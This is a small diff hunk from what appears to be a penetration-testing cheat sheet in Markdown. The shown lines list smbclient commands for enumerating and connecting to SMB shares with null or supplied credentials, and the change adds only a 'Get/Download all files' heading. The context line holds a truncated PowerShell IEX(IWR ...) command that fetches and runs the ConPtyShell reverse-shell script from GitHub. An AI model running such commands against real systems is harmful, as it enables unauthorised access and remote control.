@@ -181,6 +181,7 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 1. first enum ``` smbclient -L //{ip} --option="client min protocol=core" -U '' ```
 2. List shares: ``` smbclient -L \\{IP}\ -N ```
 3. Connect to share ``` smbclient \\\\{IP}\\{share} -U '{domain}\{username}%{password}' ```
+## Get/Download all files
 
 ## setuserinfo
 - modify user ac info
